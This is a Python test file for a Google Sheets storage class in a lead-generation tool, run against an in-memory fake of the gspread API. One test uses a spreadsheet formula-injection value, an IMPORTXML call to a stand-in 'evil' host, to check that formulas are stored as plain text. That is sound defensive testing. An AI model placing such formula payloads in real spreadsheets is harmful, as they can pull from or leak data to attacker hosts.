"""SheetsStore against an in-memory fake of the gspread Spreadsheet/Worksheet surface it uses."""

from __future__ import annotations

from typing import Any

import gspread
from gspread.utils import a1_to_rowcol

from leadgen.models import LEAD_COLUMNS, Lead, RunStats, SuppressionEntry
from leadgen.store.sheets import SheetsStore


class FakeWorksheet:
    def __init__(self, title: str, sheet_id: int, cols: int) -> None:
        self.title, self.id, self.col_count = title, sheet_id, cols
        self.cells: list[list[str]] = []
        self.input_options: list[str] = []

    def _set(self, row: int, col: int, value: Any) -> None:
        while len(self.cells) < row:
            self.cells.append([])
        r = self.cells[row - 1]
        while len(r) < col:
            r.append("")
        r[col - 1] = value

    def row_values(self, n: int) -> list[str]:
        row = self.cells[n - 1] if len(self.cells) >= n else []
        while row and row[-1] == "":
            row = row[:-1]
        return list(row)

    def get_all_values(self) -> list[list[str]]:
        width = max((len(r) for r in self.cells), default=0)
        return [r + [""] * (width - len(r)) for r in self.cells]

    def col_values(self, n: int) -> list[str]:
        return [r[n - 1] if len(r) >= n else "" for r in self.cells]

    def append_rows(self, rows, value_input_option=None, table_range=None):
        self.input_options.append(str(value_input_option))
        self.cells.extend([list(map(str, r)) for r in rows])

    def update(self, values, range_name=None, value_input_option=None):
        self.input_options.append(str(value_input_option))
        r0, c0 = a1_to_rowcol(range_name)
        for i, row in enumerate(values):
            for j, v in enumerate(row):
                self._set(r0 + i, c0 + j, v)

    def batch_update(self, data, value_input_option=None):
        for item in data:
            self.update(item["values"], item["range"], value_input_option)

    def resize(self, cols=None, rows=None):
        if cols:
            self.col_count = cols

    def clear(self):
        self.cells = []


class FakeSpreadsheet:
    title = "Test Leads"

    def __init__(self) -> None:
        self.sheets: list[FakeWorksheet] = [FakeWorksheet("Sheet1", 0, 26)]
        self.requests: list[dict[str, Any]] = []

    def worksheets(self):
        return list(self.sheets)

    def worksheet(self, title):
        for ws in self.sheets:
            if ws.title == title:
                return ws
        raise gspread.WorksheetNotFound(title)

    def add_worksheet(self, title, rows, cols, index=None):
        ws = FakeWorksheet(title, len(self.sheets) + 100, cols)
        self.sheets.append(ws)
        return ws

    def del_worksheet(self, ws):
        self.sheets.remove(ws)

    def batch_update(self, body):
        for req in body["requests"]:
            self.requests.append(req)
            if "deleteDimension" in req:
                rng = req["deleteDimension"]["range"]
                ws = next(w for w in self.sheets if w.id == rng["sheetId"])
                del ws.cells[rng["startIndex"] : rng["endIndex"]]


def make_store() -> tuple[SheetsStore, FakeSpreadsheet]:
    sh = FakeSpreadsheet()
    store = SheetsStore(sh)
    store.setup()
    return store, sh


def test_setup_creates_tabs_headers_dropdowns_and_summary():
    store, sh = make_store()
    titles = [ws.title for ws in sh.worksheets()]
    assert titles == ["Leads", "Activities", "Suppression", "Runs", "Summary"]  # empty Sheet1 removed
    assert sh.worksheet("Leads").row_values(1) == LEAD_COLUMNS
    dropdowns = [r for r in sh.requests if "setDataValidation" in r]
    assert len(dropdowns) == 2
    values = [v["userEnteredValue"] for v in dropdowns[0]["setDataValidation"]["rule"]["condition"]["values"]]
    assert values[0] == "new" and "do_not_contact" in values
    summary = sh.worksheet("Summary")
    assert summary.cells[1][0].startswith("=QUERY(Leads!A:")
    assert summary.input_options[-1] == "USER_ENTERED"
    store.setup()  # idempotent
    assert sh.worksheet("Leads").row_values(1) == LEAD_COLUMNS


def test_roundtrip_respects_user_column_order_and_raw_input():
    store, sh = make_store()
    ws = sh.worksheet("Leads")
    # A user reorders columns and adds their own column.
    header = ["email", "lead_id", "my_score", *[c for c in LEAD_COLUMNS if c not in ("email", "lead_id")]]
    ws.cells = [header]
    store._headers.clear()

    store.add_leads([Lead(lead_id="ld_a", company_name="=IMPORTXML(\"http://evil\")", email="a@a.com"),
                     Lead(lead_id="ld_b", company_name="B Co")])  # fmt: skip
    assert ws.cells[1][0] == "a@a.com" and ws.cells[1][1] == "ld_a" and ws.cells[1][2] == ""
    assert set(ws.input_options[-1:]) == {"RAW"}  # formulas are stored as text

    leads = store.load_leads()
    assert [lead.lead_id for lead in leads] == ["ld_a", "ld_b"]
    assert leads[0].company_name.startswith("=IMPORTXML")


def test_update_and_delete():
    store, sh = make_store()
    store.add_leads([Lead(lead_id=f"ld_{i}", company_name=f"C{i}") for i in range(5)])
    assert (
        store.update_leads({"ld_3": {"status": "contacted", "notes": "hi"}, "ld_missing": {"status": "won"}})
        == 1
    )
    lead = next(lead for lead in store.load_leads() if lead.lead_id == "ld_3")
    assert (lead.status, lead.notes) == ("contacted", "hi") and lead.updated_at

    assert store.delete_leads(["ld_1", "ld_3", "ld_nope"]) == 2
    assert [lead.lead_id for lead in store.load_leads()] == ["ld_0", "ld_2", "ld_4"]


def test_suppression_activities_runs():
    store, _ = make_store()
    entry = SuppressionEntry(hash="h1", kind="email", reason="test")
    store.add_suppression([entry, entry])
    store.add_suppression([entry])
    assert store.load_suppression() == {"h1"}

    store.add_activity("ld_1", "note", "called")
    store.add_activity("ld_2", "note", "emailed")
    assert store.delete_activities(["ld_1"]) == 1

    store.log_run(RunStats(search="a", new=3))
    store.log_run(RunStats(search="b", new=1))
    runs = store.list_runs()
    assert [r["search"] for r in runs] == ["b", "a"] and runs[1]["new"] == "3"
